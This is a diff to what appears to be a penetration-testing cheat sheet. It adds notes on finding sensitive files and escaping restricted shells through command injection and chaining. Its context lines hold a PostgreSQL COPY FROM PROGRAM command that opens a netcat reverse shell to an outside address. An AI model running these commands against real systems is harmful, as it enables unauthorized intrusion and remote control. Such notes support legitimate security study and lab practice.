@@ -1014,8 +1014,18 @@ command execution:
 CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
 ```
-### Check Compressed files
+### Check Sensitive files
 ```
-check zip,gz,7z,stix,rar files
+check zip,gz,7z,stix,rar,conf,config,sh
 ```
-
+### Escaping Restricted Shells
+Command injection
+```
+ls -l `pwd` 
+```
+Command Chaining
+>In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.
+```
+ls -l ; pwd
+ls -l | pwd
+```
